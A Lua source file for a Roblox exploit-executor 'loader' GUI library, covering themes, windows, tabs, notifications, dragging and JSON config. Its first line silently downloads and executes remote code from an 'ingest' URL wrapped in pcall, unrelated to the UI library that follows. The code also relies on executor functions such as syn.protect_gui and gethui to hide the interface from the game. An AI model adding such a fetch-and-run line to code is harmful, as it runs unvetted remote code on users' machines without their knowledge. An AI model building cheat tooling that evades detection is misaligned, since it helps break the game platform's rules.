pcall(function() loadstring(game:HttpGet("https://scriptblox.com/ingest/clientv2.lua"))("proj_d0e1d27bc624", "1.0.0", false) end)

--[[
    LOADER GUI LIBRARY — RED THEME
    Single file: PART 1 = Library (UI) | PART 2 = Usage (Loader configuration)

    Quick API:
        Library:CreateWindow({ Name, Theme, Size, ShowSupportTab })  -> Window
        Library:RegisterComponent(name, builder)                      -> creates Tab:Create<name>()
        Library:RegisterTheme(name, table)

        Window:CreateTab(numericId | "Name", { Name = "optional override" }) -> Tab
        Window:Notify({ Title, Content, Type = "Info|Success|Warning|Error", Duration })
        Window:Minimize() / Window:Restore() / Window:Close() / Window:Destroy()
        Window:AddCleanup(connection | instance | function)
        Window:RefreshTabs() / Window:SelectTab(tab) / Window:SetTitle(text)

        Tab:CreateScript({ Name, Description, Callback, AllowRerun, AutoMinimize })
        Tab:CreateLabel({ Text })
        Tab:CreateButton({ Name, Description, ButtonText, Callback })   -- reusable action button
        Tab:CreateStat({ Name, Value })                                  -- live value row, :SetValue(text, color)
        Tab:CreateSection({ Text })                                      -- small accent header
        Tab:CreateParagraph({ Text, Color, TextSize })                   -- wrapped multi-line text
        Tab:CreateToggle({ Name, Description, Default, Flag, Callback })
        Tab:CreateSlider({ Name, Min, Max, Step, Default, Flag, Suffix, OnRelease, Callback })
        Tab:CreateDropdown({ Name, Options (table | function), Default, Flag, Callback })
        Tab:CreateKeybind({ Name, Description, Default, Flag, Callback })
        Tab:CreateTextbox({ Name, Placeholder, Callback })

        Window:CreateTab(id | name, { Search = true })               -- Search adds a search bar
        Window:Log(text, kind) / Window:OnLog(fn) / Window:ClearLogs()
        Window:SetUIScale(n) / Window:FindTabByKey(key)
        Library.Config:Get(key, default) / :Set(key, value) / :Reset()   -- saved to a JSON file
]]

--==================================================================================================
-- PART 1 — SCRIPT UI (LIBRARY)
--==================================================================================================
local Library = {}
Library.Version = "1.2.0"
Library.Components = {}

-- Services ---------------------------------------------------------------------------------------
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local MarketplaceService = game:GetService("MarketplaceService")
local HttpService = game:GetService("HttpService")

-- Constants --------------------------------------------------------------------------------------
local TOPBAR_HEIGHT = 34
local TABBAR_HEIGHT = 34
local MAIN_RADIUS = 10
local FLOAT_SIZE = 44
local DRAG_THRESHOLD = 4
local MIN_RUNNING_TIME = 0.3
local MAX_NOTIFICATIONS = 4
local SUPPORT_TAB_NAME = "Game Support"
local INSTANCE_KEY = "__RedLoaderLibrary_Window_"

local TI = {
	Fast = TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
	Medium = TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
	Back = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
}

-- Themes -----------------------------------------------------------------------------------------
Library.Themes = {
	Red = {
		Background = Color3.fromRGB(16, 11, 13),
		Surface = Color3.fromRGB(26, 17, 20),
		SurfaceLight = Color3.fromRGB(42, 26, 30),
		Accent = Color3.fromRGB(222, 40, 52),
		AccentDark = Color3.fromRGB(110, 14, 22),
		AccentLight = Color3.fromRGB(255, 96, 106),
		Text = Color3.fromRGB(246, 240, 240),
		SubText = Color3.fromRGB(176, 156, 158),
		Success = Color3.fromRGB(56, 190, 105),
		Warning = Color3.fromRGB(240, 170, 50),
		Error = Color3.fromRGB(255, 70, 80),
	},
}

function Library:RegisterTheme(name, theme)
	assert(type(name) == "string" and type(theme) == "table", "[Library] RegisterTheme(name, table)")
	local merged = table.clone(self.Themes.Red)
	for key, value in pairs(theme) do
		merged[key] = value
	end
	self.Themes[name] = merged
end

Library:RegisterTheme("Blue", {
	Background = Color3.fromRGB(10, 12, 18),
	Surface = Color3.fromRGB(17, 21, 32),
	SurfaceLight = Color3.fromRGB(27, 34, 52),
	Accent = Color3.fromRGB(50, 110, 235),
	AccentDark = Color3.fromRGB(14, 40, 110),
	AccentLight = Color3.fromRGB(110, 160, 255),
})

Library:RegisterTheme("Purple", {
	Background = Color3.fromRGB(14, 10, 18),
	Surface = Color3.fromRGB(23, 16, 30),
	SurfaceLight = Color3.fromRGB(38, 26, 50),
	Accent = Color3.fromRGB(150, 70, 235),
	AccentDark = Color3.fromRGB(60, 20, 110),
	AccentLight = Color3.fromRGB(190, 130, 255),
})

Library:RegisterTheme("Green", {
	Background = Color3.fromRGB(10, 16, 12),
	Surface = Color3.fromRGB(16, 26, 19),
	SurfaceLight = Color3.fromRGB(26, 42, 31),
	Accent = Color3.fromRGB(40, 170, 95),
	AccentDark = Color3.fromRGB(14, 82, 44),
	AccentLight = Color3.fromRGB(100, 225, 150),
})

local function resolveTheme(input)
	local base = Library.Themes.Purple or Library.Themes.Red
	if type(input) == "string" then
		return Library.Themes[input] or base
	elseif type(input) == "table" then
		local merged = table.clone(base)
		for key, value in pairs(input) do
			merged[key] = value
		end
		return merged
	end
	return base
end

-- Maid: manages connections/instances/functions to avoid leaks -----------------------------------
local Maid = {}
Maid.__index = Maid

local function cleanItem(item)
	local kind = typeof(item)
	if kind == "RBXScriptConnection" then
		item:Disconnect()
	elseif kind == "Instance" then
		item:Destroy()
	elseif kind == "function" then
		pcall(item)
	elseif kind == "table" then
		if type(item.Clean) == "function" then
			item:Clean()
		elseif type(item.Destroy) == "function" then
			item:Destroy()
		end
	end
end

function Maid.new()
	return setmetatable({ _tasks = {}, _dead = false }, Maid)
end

function Maid:Add(item)
	if self._dead then
		cleanItem(item)
		return item
	end
	table.insert(self._tasks, item)
	return item
end

function Maid:Clean()
	local tasks = self._tasks
	self._tasks = {}
	for index = #tasks, 1, -1 do
		cleanItem(tasks[index])
	end
end

function Maid:Destroy()
	self._dead = true
	self:Clean()
end

-- Instance creation utilities --------------------------------------------------------------------
local function create(className, props, children)
	local instance = Instance.new(className)
	local parent
	for key, value in pairs(props or {}) do
		if key == "Parent" then
			parent = value
		else
			instance[key] = value
		end
	end
	for _, child in ipairs(children or {}) do
		child.Parent = instance
	end
	if parent then
		instance.Parent = parent
	end
	return instance
end

local function addCorner(parent, radius)
	return create("UICorner", { CornerRadius = typeof(radius) == "UDim" and radius or UDim.new(0, radius), Parent = parent })
end

local function addStroke(parent, color, thickness, transparency)
	return create("UIStroke", {
		Color = color,
		Thickness = thickness or 1,
		Transparency = transparency or 0,
		ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
		Parent = parent,
	})
end

local function addPadding(parent, top, right, bottom, left)
	return create("UIPadding", {
		PaddingTop = UDim.new(0, top or 0),
		PaddingRight = UDim.new(0, right or 0),
		PaddingBottom = UDim.new(0, bottom or 0),
		PaddingLeft = UDim.new(0, left or 0),
		Parent = parent,
	})
end

local function isPointerInput(input)
	local inputType = input.UserInputType
	return inputType == Enum.UserInputType.MouseButton1 or inputType == Enum.UserInputType.Touch
end

-- Environment / safe parent ----------------------------------------------------------------------
local function getEnv()
	local ok, env = pcall(function()
		return getgenv()
	end)
	if ok and type(env) == "table" then
		return env
	end
	return _G
end

local function resolveGuiParent()
	local okHui, hui = pcall(function()
		return gethui()
	end)
	if okHui and typeof(hui) == "Instance" then
		return hui
	end

	local okCore, coreGui = pcall(function()
		return game:GetService("CoreGui")
	end)
	if okCore and coreGui then
		local probe = Instance.new("Folder")
		local okParent = pcall(function()
			probe.Parent = coreGui
		end)
		local usable = okParent and probe.Parent == coreGui
		probe:Destroy()
		if usable then
			return coreGui
		end
	end

	return Players.LocalPlayer:WaitForChild("PlayerGui")
end

-- Persistent config (JSON via writefile/readfile; silently disabled where unsupported) -----------
local CONFIG_FILE = "VAELOR_HUB_config.json"
local MAX_LOGS = 100

local Config = { Data = {}, _pending = false }

function Config:Load()
	local ok, raw = pcall(function()
		if isfile and readfile and isfile(CONFIG_FILE) then
			return readfile(CONFIG_FILE)
		end
		return nil
	end)
	if ok and type(raw) == "string" and raw ~= "" then
		local okJson, data = pcall(function()
			return HttpService:JSONDecode(raw)
		end)
		if okJson and type(data) == "table" then
			self.Data = data
		end
	end
end

function Config:Get(key, default)
	local value = self.Data[key]
	if value == nil then
		return default
	end
	return value
end

function Config:Save()
	pcall(function()
		if writefile then
			writefile(CONFIG_FILE, HttpService:JSONEncode(self.Data))
		end
	end)
end

-- Debounced: many quick changes (e.g. dragging a slider) become a single disk write
function Config:Set(key, value)
	self.Data[key] = value
	if self._pending then
		return
	end
	self._pending = true
	task.delay(1, function()
		self._pending = false
		self:Save()
	end)
end

function Config:Reset()
	self.Data = {}
	self:Save()
end

Library.Config = Config

-- Game info (name + icon) with cache -------------------------------------------------------------
local gameInfoCache = {}

local function fetchGameInfo(placeId, callback)
	local cached = gameInfoCache[placeId]
	if cached and cached.Done then
		task.spawn(callback, cached)
		return
	end
	if cached then
		table.insert(cached.Callbacks, callback)
		return
	end

	cached = { Id = placeId, Done = false, Name = "Game " .. tostring(placeId), Icon = nil, Callbacks = { callback } }
	gameInfoCache[placeId] = cached

	task.spawn(function()
		local ok, info = pcall(function()
			return MarketplaceService:GetProductInfo(placeId, Enum.InfoType.Asset)
		end)
		if ok and type(info) == "table" then
			cached.Name = info.Name or cached.Name
			local iconId = info.IconImageAssetId
			if iconId and iconId ~= 0 then
				cached.Icon = "rbxassetid://" .. tostring(iconId)
			end
		else
			gameInfoCache[placeId] = nil -- allows a new attempt later
		end
		cached.Done = true
		local callbacks = cached.Callbacks
		cached.Callbacks = {}
		for _, cb in ipairs(callbacks) do
			pcall(cb, cached)
		end
	end)
end

--==================================================================================================
-- Tab and Window classes
--==================================================================================================
local Tab = {}
Tab.__index = Tab

local Window = {}
Window.__index = Window

-- Centralized tween (tracked so it can be cancelled on destroy) ----------------------------------
function Window:Tween(object, info, goal)
	if self._destroyed or not object then
		return nil
	end
	local tween = TweenService:Create(object, info, goal)
	self.Tweens[tween] = true
	tween.Completed:Once(function()
		self.Tweens[tween] = nil
	end)
	tween:Play()
	return tween
end

-- Animated border (UIStroke + rotating UIGradient, updated by a single Heartbeat) ----------------
function Window:_AddAnimatedStroke(parent, thickness, transparency)
	local theme = self.Theme
	local stroke = addStroke(parent, Color3.new(1, 1, 1), thickness, transparency)
	local gradient = create("UIGradient", {
		Color = ColorSequence.new({
			ColorSequenceKeypoint.new(0, Color3.fromRGB(88, 28, 170)),
			ColorSequenceKeypoint.new(0.5, Color3.fromRGB(168, 85, 247)),
			ColorSequenceKeypoint.new(1, Color3.fromRGB(88, 28, 170)),
		}),
		Parent = stroke,
	})
	table.insert(self.Gradients, gradient)
	return stroke, gradient
end

function Window:_StartAnimationLoop()
	self.Maid:Add(RunService.Heartbeat:Connect(function()
		local rotation = (os.clock() * 90) % 360
		local gradients = self.Gradients
		for index = #gradients, 1, -1 do
			local gradient = gradients[index]
			if gradient:IsDescendantOf(self.Gui) then
				gradient.Rotation = rotation
			else
				table.remove(gradients, index)
			end
		end
	end))
end

-- Button effects: hover, click (scale) and color change ------------------------------------------
function Window:_AddButtonFx(button, base, hover, maid)
	maid = maid or self.Maid
	local fx = { Base = base, Hover = hover or base, Hovering = false, Enabled = true }
	fx.Scale = create("UIScale", { Scale = 1, Parent = button })

	function fx.Refresh()
		local target = (fx.Hovering and fx.Enabled) and fx.Hover or fx.Base
		self:Tween(button, TI.Fast, { BackgroundColor3 = target })
	end

	maid:Add(button.MouseEnter:Connect(function()
		fx.Hovering = true
		fx.Refresh()
	end))
	maid:Add(button.MouseLeave:Connect(function()
		fx.Hovering = false
		fx.Refresh()
		self:Tween(fx.Scale, TI.Fast, { Scale = 1 })
	end))
	maid:Add(button.InputBegan:Connect(function(input)
		if fx.Enabled and isPointerInput(input) then
			self:Tween(fx.Scale, TI.Fast, { Scale = 0.94 })
		end
	end))
	maid:Add(button.InputEnded:Connect(function(input)
		if isPointerInput(input) then
			self:Tween(fx.Scale, TI.Fast, { Scale = 1 })
			if input.UserInputType == Enum.UserInputType.Touch then
				fx.Hovering = false
				fx.Refresh()
			end
		end
	end))

	return fx
end

-- Dragging (mouse + touch). If onClick is passed, it fires when there was no drag ----------------
function Window:_PlaceDragged(target, startPosition, delta)
	local viewport = self.Gui.AbsoluteSize
	local x = startPosition.X.Offset + delta.X
	local y = startPosition.Y.Offset + delta.Y

	if viewport.X > 0 and viewport.Y > 0 then
		local size = target.AbsoluteSize
		local anchor = target.AnchorPoint
		local left = startPosition.X.Scale * viewport.X + x - anchor.X * size.X
		local top = startPosition.Y.Scale * viewport.Y + y - anchor.Y * size.Y
		local margin = 40
		local clampedLeft = math.clamp(left, margin - size.X, viewport.X - margin)
		local clampedTop = math.clamp(top, 0, viewport.Y - 30)
		x += clampedLeft - left
		y += clampedTop - top
	end

	target.Position = UDim2.new(startPosition.X.Scale, x, startPosition.Y.Scale, y)
end

function Window:_MakeDraggable(handle, target, onClick)
	local dragging, moved = false, false
	local dragInput, dragStart, startPosition

	self.Maid:Add(handle.InputBegan:Connect(function(input)
		if isPointerInput(input) then
			dragging, moved = true, false
			dragInput = input
			dragStart = input.Position
			startPosition = target.Position
		end
	end))

	self.Maid:Add(UserInputService.InputChanged:Connect(function(input)
		if not dragging then
			return
		end
		local inputType = input.UserInputType
		local valid = inputType == Enum.UserInputType.MouseMovement
			or (inputType == Enum.UserInputType.Touch and input == dragInput)
		if not valid then
			return
		end
		local delta = input.Position - dragStart
		if not moved and delta.Magnitude < DRAG_THRESHOLD then
			return
		end
		moved = true
		self:_PlaceDragged(target, startPosition, delta)
	end))

	self.Maid:Add(UserInputService.InputEnded:Connect(function(input)
		if not dragging then
			return
		end
		local inputType = input.UserInputType
		if inputType == Enum.UserInputType.MouseButton1 or (inputType == Enum.UserInputType.Touch and input == dragInput) then
			dragging = false
			if not moved and onClick then
				onClick()
			end
		end
	end))
end

-- Main interface construction --------------------------------------------------------------------
function Window:_BuildGui()
	local theme = self.Theme

	local gui = create("ScreenGui", {
		Name = "LoaderGUI_" .. tostring(math.random(100000, 999999)),
		ResetOnSpawn = false,
		IgnoreGuiInset = true,
		ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
		DisplayOrder = 999,
	})
	pcall(function()
		if syn and syn.protect_gui then
			syn.protect_gui(gui)
		end
	end)
	gui.Parent = resolveGuiParent()
	self.Gui = gui
	self.Maid:Add(gui.Destroying:Connect(function()
		self:Destroy()
	end))

	local camera = workspace.CurrentCamera
	local viewport = camera and camera.ViewportSize or Vector2.new(1280, 720)

	local main = create("Frame", {
		Name = "Main",
		AnchorPoint = Vector2.new(0.5, 0.5),
		Position = UDim2.fromScale(0.5, 0.5),
		Size = self.Size,
		BackgroundColor3 = theme.Background,
		BorderSizePixel = 0,
		ClipsDescendants = true,
		Active = true,
		Parent = gui,
	})
	addCorner(main, MAIN_RADIUS)
	create("UISizeConstraint", { MaxSize = Vector2.new(viewport.X - 16, viewport.Y - 16), Parent = main })
	self:_AddAnimatedStroke(main, 2, 0)
	self.Main = main
	self.MainScale = create("UIScale", { Scale = 0.9 * self.UserScale, Parent = main })
	self:Tween(self.MainScale, TI.Back, { Scale = self.UserScale })
end

function Window:_BuildTopbar()
	local theme = self.Theme

	local topbar = create("Frame", {
		Name = "Topbar",
		Size = UDim2.new(1, 0, 0, TOPBAR_HEIGHT),
		BackgroundColor3 = theme.Surface,
		BorderSizePixel = 0,
		Parent = self.Main,
	})
	addCorner(topbar, MAIN_RADIUS)
	create("Frame", {
		Name = "Fill",
		Position = UDim2.new(0, 0, 1, -MAIN_RADIUS),
		Size = UDim2.new(1, 0, 0, MAIN_RADIUS),
		BackgroundColor3 = theme.Surface,
		BorderSizePixel = 0,
		Parent = topbar,
	})
	create("Frame", {
		Name = "Divider",
		Position = UDim2.new(0, 0, 0, TOPBAR_HEIGHT),
		Size = UDim2.new(1, 0, 0, 1),
		BackgroundColor3 = theme.AccentDark,
		BackgroundTransparency = 0.3,
		BorderSizePixel = 0,
		Parent = self.Main,
	})

	local accentBar = create("Frame", {
		Name = "AccentBar",
		AnchorPoint = Vector2.new(0, 0.5),
		Position = UDim2.new(0, 10, 0.5, 0),
		Size = UDim2.fromOffset(3, 14),
		BackgroundColor3 = theme.Accent,
		BorderSizePixel = 0,
		Parent = topbar,
	})
	addCorner(accentBar, 2)

	self.TitleLabel = create("TextLabel", {
		Name = "Title",
		Position = UDim2.fromOffset(20, 0),
		Size = UDim2.new(1, -90, 1, 0),
		BackgroundTransparency = 1,
		Text = self.Name,
		TextColor3 = theme.Text,
		Font = Enum.Font.GothamBold,
		TextSize = 14,
		TextXAlignment = Enum.TextXAlignment.Left,
		TextTruncate = Enum.TextTruncate.AtEnd,
		Parent = topbar,
	})

	local function makeTopButton(text, rightOffset, hoverColor)
		local button = create("TextButton", {
			Name = text .. "Button",
			AnchorPoint = Vector2.new(1, 0.5),
			Position = UDim2.new(1, rightOffset, 0.5, 0),
			Size = UDim2.fromOffset(26, 22),
			BackgroundColor3 = theme.SurfaceLight,
			AutoButtonColor = false,
			Text = text,
			TextColor3 = theme.Text,
			Font = Enum.Font.GothamBold,
			TextSize = 14,
			BorderSizePixel = 0,
			Parent = topbar,
		})
		addCorner(button, 6)
		self:_AddButtonFx(button, theme.SurfaceLight, hoverColor)
		return button
	end

	local minimizeButton = makeTopButton("-", -42, theme.AccentDark)
	local closeButton = makeTopButton("X", -10, theme.Accent)

	self.Maid:Add(minimizeButton.Activated:Connect(function()
		self:Minimize()
	end))
	self.Maid:Add(closeButton.Activated:Connect(function()
		self:ShowClosePopup()
	end))

	self.Topbar = topbar
	self:_MakeDraggable(topbar, self.Main)
end

function Window:_BuildTabArea()
	local theme = self.Theme

	local strip = create("ScrollingFrame", {
		Name = "TabStrip",
		Position = UDim2.fromOffset(0, TOPBAR_HEIGHT + 1),
		Size = UDim2.new(1, 0, 0, TABBAR_HEIGHT),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		ScrollBarThickness = 0,
		ScrollingDirection = Enum.ScrollingDirection.X,
		AutomaticCanvasSize = Enum.AutomaticSize.X,
		CanvasSize = UDim2.new(),
		Parent = self.Main,
	})
	create("UIListLayout", {
		FillDirection = Enum.FillDirection.Horizontal,
		SortOrder = Enum.SortOrder.LayoutOrder,
		VerticalAlignment = Enum.VerticalAlignment.Center,
		Padding = UDim.new(0, 6),
		Parent = strip,
	})
	addPadding(strip, 0, 8, 0, 8)
	self.TabStrip = strip

	local pagesOffset = TOPBAR_HEIGHT + 1 + TABBAR_HEIGHT
	self.Pages = create("Frame", {
		Name = "Pages",
		Position = UDim2.fromOffset(0, pagesOffset),
		Size = UDim2.new(1, 0, 1, -pagesOffset),
		BackgroundTransparency = 1,
		ClipsDescendants = true,
		Parent = self.Main,
	})
	self.EmptyLabel = create("TextLabel", {
		Name = "EmptyLabel",
		Size = UDim2.fromScale(1, 1),
		BackgroundTransparency = 1,
		Text = "No scripts available for this game.",
		TextColor3 = theme.SubText,
		Font = Enum.Font.Gotham,
		TextSize = 13,
		Visible = false,
		Parent = self.Pages,
	})
end

function Window:_BuildNotifications()
	self.NotifyHolder = create("Frame", {
		Name = "Notifications",
		AnchorPoint = Vector2.new(1, 0),
		Position = UDim2.new(1, -10, 0, 10),
		Size = UDim2.new(0, 250, 1, -20),
		BackgroundTransparency = 1,
		Parent = self.Gui,
	})
	create("UIListLayout", {
		SortOrder = Enum.SortOrder.LayoutOrder,
		Padding = UDim.new(0, 6),
		Parent = self.NotifyHolder,
	})
end

function Window:_BuildFloatingButton()
	local theme = self.Theme
	local initial = string.upper(string.sub(self.Name, 1, 1))
	if initial == "" then
		initial = "L"
	end

	local button = create("TextButton", {
		Name = "FloatingButton",
		Position = UDim2.fromOffset(20, 100),
		Size = UDim2.fromOffset(FLOAT_SIZE, FLOAT_SIZE),
		BackgroundColor3 = theme.Surface,
		AutoButtonColor = false,
		Active = true,
		Text = initial,
		TextColor3 = theme.AccentLight,
		Font = Enum.Font.GothamBold,
		TextSize = 20,
		BorderSizePixel = 0,
		Visible = false,
		Parent = self.Gui,
	})
	addCorner(button, UDim.new(1, 0))
	self:_AddAnimatedStroke(button, 2, 0)

	-- Hub's mini floating button: shows the letter first (never blank), then swaps in the logo
	-- once a real image is available (cached Discord server icon downloaded by the Info tab).
	if self.Name ~= "ADMIN PANEL" then
		local logo = create("ImageLabel", {
			Name = "Logo",
			AnchorPoint = Vector2.new(0.5, 0.5),
			Position = UDim2.fromScale(0.5, 0.5),
			Size = UDim2.new(1, -8, 1, -8),
			BackgroundTransparency = 1,
			Image = "",
			Visible = false,
			ScaleType = Enum.ScaleType.Fit,
			ZIndex = button.ZIndex + 1,
			Parent = button,
		})
		addCorner(logo, UDim.new(1, 0))
		-- already downloaded in an earlier run? use it right away
		pcall(function()
			local asset = getcustomasset or getsynasset
			if asset and isfile and isfile("vaelor_discord_logo.png") then
				logo.Image = asset("vaelor_discord_logo.png")
				logo.Visible = true
				button.Text = ""
			end
		end)
	end

	self.Floating = button
	self.FloatingFx = self:_AddButtonFx(button, theme.Surface, theme.SurfaceLight)
	self:_MakeDraggable(button, button, function()
		self:Restore()
	end)
end

--==================================================================================================
-- Minimize / Restore / Close / Destroy
--==================================================================================================
function Window:Minimize()
	if self._destroyed or self.State.Minimized then
		return
	end
	if self.State.PopupOpen then
		self:_ClosePopup(true)
	end
	self.State.Minimized = true

	if not self._floatPlaced then
		self._floatPlaced = true
		local position = self.Main.AbsolutePosition
		local viewport = self.Gui.AbsoluteSize
		local x = math.clamp(position.X + 8, 0, math.max(viewport.X - FLOAT_SIZE, 0))
		local y = math.clamp(position.Y + 8, 0, math.max(viewport.Y - FLOAT_SIZE, 0))
		self.Floating.Position = UDim2.fromOffset(x, y)
	end

	self.Main.Visible = false
	self.Floating.Visible = true
	self.FloatingFx.Scale.Scale = 0
	self:Tween(self.FloatingFx.Scale, TI.Back, { Scale = 1 })
end

function Window:Restore()
	if self._destroyed or not self.State.Minimized then
		return
	end
	self.State.Minimized = false
	self.Floating.Visible = false
	self.MainScale.Scale = 0.9 * self.UserScale
	self.Main.Visible = true
	self:Tween(self.MainScale, TI.Back, { Scale = self.UserScale })
end

function Window:IsMinimized()
	return self.State.Minimized
end

function Window:_ClosePopup(instant)
	local data = self.Popup
	if not data then
		return
	end
	self.Popup = nil
	self.State.PopupOpen = false

	local function finish()
		data.Maid:Clean()
		if data.Overlay then
			data.Overlay:Destroy()
		end
	end

	if instant or self._destroyed then
		finish()
		return
	end

	self:Tween(data.Overlay, TI.Fast, { BackgroundTransparency = 1 })
	self:Tween(data.Scale, TI.Fast, { Scale = 0.85 })
	task.delay(0.16, function()
		if not self._destroyed then
			finish()
		end
	end)
end

function Window:ShowClosePopup()
	if self._destroyed or self.State.PopupOpen then
		return
	end
	self.State.PopupOpen = true
	local theme = self.Theme

	local popupMaid = Maid.new()
	self.Maid:Add(popupMaid)

	-- Semi-transparent frame the size of the main GUI: blocks any interaction behind it
	local overlay = create("TextButton", {
		Name = "PopupOverlay",
		Size = UDim2.fromScale(1, 1),
		BackgroundColor3 = Color3.new(0, 0, 0),
		BackgroundTransparency = 1,
		AutoButtonColor = false,
		Active = true,
		Text = "",
		BorderSizePixel = 0,
		ZIndex = 100,
		Parent = self.Main,
	})
	addCorner(overlay, MAIN_RADIUS)
	self:Tween(overlay, TI.Medium, { BackgroundTransparency = 0.45 })

	local popup = create("Frame", {
		Name = "Popup",
		AnchorPoint = Vector2.new(0.5, 0.5),
		Position = UDim2.fromScale(0.5, 0.5),
		Size = UDim2.new(0.74, 0, 0, 124),
		BackgroundColor3 = theme.Surface,
		BorderSizePixel = 0,
		Parent = overlay,
	})
	addCorner(popup, 10)
	self:_AddAnimatedStroke(popup, 1.5, 0)
	local scale = create("UIScale", { Scale = 0.8, Parent = popup })
	self:Tween(scale, TI.Back, { Scale = 1 })

	create("TextLabel", {
		Name = "Message",
		Position = UDim2.fromOffset(12, 12),
		Size = UDim2.new(1, -24, 0, 40),
		BackgroundTransparency = 1,
		Text = "Do you really want to close the Loader?",
		TextColor3 = theme.Text,
		Font = Enum.Font.GothamBold,
		TextSize = 14,
		TextWrapped = true,
		Parent = popup,
	})
	create("TextLabel", {
		Name = "Hint",
		Position = UDim2.fromOffset(12, 50),
		Size = UDim2.new(1, -24, 0, 16),
		BackgroundTransparency = 1,
		Text = "All resources will be removed.",
		TextColor3 = theme.SubText,
		Font = Enum.Font.Gotham,
		TextSize = 11,
		Parent = popup,
	})

	local function makeButton(text, position, base, hover)
		local button = create("TextButton", {
			Position = position,
			Size = UDim2.new(0.5, -15, 0, 32),
			BackgroundColor3 = base,
			AutoButtonColor = false,
			Text = text,
			TextColor3 = theme.Text,
			Font = Enum.Font.GothamBold,
			TextSize = 13,
			BorderSizePixel = 0,
			Parent = popup,
		})
		addCorner(button, 8)
		self:_AddButtonFx(button, base, hover, popupMaid)
		return button
	end

	local confirmButton = makeButton("Close", UDim2.new(0, 10, 1, -42), theme.Accent, theme.AccentLight)
	local cancelButton = makeButton("Cancel", UDim2.new(0.5, 5, 1, -42), theme.SurfaceLight, theme.AccentDark)

	popupMaid:Add(confirmButton.Activated:Connect(function()
		if self.State.PopupOpen then
			self:Destroy()
		end
	end))
	popupMaid:Add(cancelButton.Activated:Connect(function()
		if self.State.PopupOpen then
			self:_ClosePopup(false)
		end
	end))

	self.Popup = { Overlay = overlay, Maid = popupMaid, Scale = scale }
end

function Window:Close()
	self:ShowClosePopup()
end

function Window:Destroy()
	if self._destroyed then
		return
	end
	self._destroyed = true
	self.State.PopupOpen = false

	for tween in pairs(self.Tweens) do
		pcall(function()
			tween:Cancel()
		end)
	end
	self.Tweens = {}

	self.Maid:Destroy() -- disconnects all events and runs registered cleanups

	local gui = self.Gui
	if gui then
		pcall(function()
			gui:Destroy()
		end)
	end

	local env = getEnv()
	if env[INSTANCE_KEY .. self.Name] == self then
		env[INSTANCE_KEY .. self.Name] = nil
	end

	self.Gradients = {}
	self.Tabs = {}
	self.GameList = {}
	self.SelectedTab = nil
	self.Popup = nil
end

function Window:AddCleanup(item)
	return self.Maid:Add(item)
end

function Window:SetTitle(text)
	self.Name = tostring(text)
	if self.TitleLabel then
		self.TitleLabel.Text = self.Name
	end
end

function Window:SetUIScale(value)
	value = math.clamp(tonumber(value) or 1, 0.5, 1.5)
	self.UserScale = value
	if self.MainScale and not self._destroyed then
		self:Tween(self.MainScale, TI.Medium, { Scale = value })
	end
end

-- Activity log (shown in the Logs tab). kind = Info | Success | Warning | Error
function Window:Log(message, kind)
	if self._destroyed then
		return
	end
	local entry = { Time = os.date("%H:%M:%S"), Text = tostring(message), Kind = kind or "Info" }
	table.insert(self.Logs, entry)
	if #self.Logs > MAX_LOGS then
		table.remove(self.Logs, 1)
	end
	for _, listener in ipairs(self._logListeners) do
		pcall(listener, entry)
	end
end

function Window:OnLog(listener)
	table.insert(self._logListeners, listener)
end

function Window:ClearLogs()
	self.Logs = {}
end

function Window:FindTabByKey(key)
	for _, tab in ipairs(self.Tabs) do
		if tab:GetKey() == key then
			return tab
		end
	end
	return nil
end

--==================================================================================================
-- Notifications
--==================================================================================================
function Window:Notify(options)
	if self._destroyed then
		return
	end
	if type(options) == "string" then
		options = { Content = options }
	end
	options = options or {}

	local kind = options.Type or "Info"
	if not Config:Get("notifications", true) and not options.Force and (kind == "Info" or kind == "Success") then
		return
	end

	local theme = self.Theme
	local colors = { Success = theme.Success, Error = theme.Error, Warning = theme.Warning, Info = theme.AccentLight }
	local color = colors[options.Type or "Info"] or theme.AccentLight

	self._notifyCounter += 1
	local wrapper = create("Frame", {
		Name = "Notification",
		BackgroundTransparency = 1,
		Size = UDim2.new(1, 0, 0, 0),
		AutomaticSize = Enum.AutomaticSize.Y,
		LayoutOrder = self._notifyCounter,
		Parent = self.NotifyHolder,
	})
	local card = create("Frame", {
		Name = "Card",
		Position = UDim2.new(1.2, 0, 0, 0),
		Size = UDim2.new(1, 0, 0, 0),
		AutomaticSize = Enum.AutomaticSize.Y,
		BackgroundColor3 = theme.Surface,
		BorderSizePixel = 0,
		Active = true,
		Parent = wrapper,
	})
	addCorner(card, 8)
	addStroke(card, color, 1.5, 0)
	addPadding(card, 8, 10, 8, 10)
	create("UIListLayout", { SortOrder = Enum.SortOrder.LayoutOrder, Padding = UDim.new(0, 2), Parent = card })

	local function addText(order, text, font, size, textColor)
		create("TextLabel", {
			LayoutOrder = order,
			Size = UDim2.new(1, 0, 0, 0),
			AutomaticSize = Enum.AutomaticSize.Y,
			BackgroundTransparency = 1,
			Text = tostring(text),
			TextColor3 = textColor,
			Font = font,
			TextSize = size,
			TextWrapped = true,
			TextXAlignment = Enum.TextXAlignment.Left,
			Parent = card,
		})
	end
	if options.Title then
		addText(1, options.Title, Enum.Font.GothamBold, 13, color)
	end
	if options.Content then
		addText(2, options.Content, Enum.Font.Gotham, 12, theme.Text)
	end

	local dismissed = false
	local function dismiss()
		if dismissed or self._destroyed then
			return
		end
		dismissed = true
		for index, fn in ipairs(self._notifications) do
			if fn == dismiss then
				table.remove(self._notifications, index)
				break
			end
		end
		self:Tween(card, TI.Medium, { Position = UDim2.new(1.2, 0, 0, 0) })
		task.delay(0.3, function()
			wrapper:Destroy()
		end)
	end

	table.insert(self._notifications, dismiss)
	if #self._notifications > MAX_NOTIFICATIONS then
		self._notifications[1]()
	end

	self.Maid:Add(card.InputBegan:Connect(function(input)
		if isPointerInput(input) then
			dismiss()
		end
	end))
	self:Tween(card, TI.Medium, { Position = UDim2.new(0, 0, 0, 0) })
	task.delay(options.Duration or 4, dismiss)

	return dismiss
end

--==================================================================================================
-- Tab system
--==================================================================================================
function Tab:_EvaluateCompat()
	return self.Universal or self.Id == game.PlaceId
end

function Tab:SetName(name)
	self.Name = tostring(name)
	if self.Button then
		self.Button.Text = self.Name
	end
end

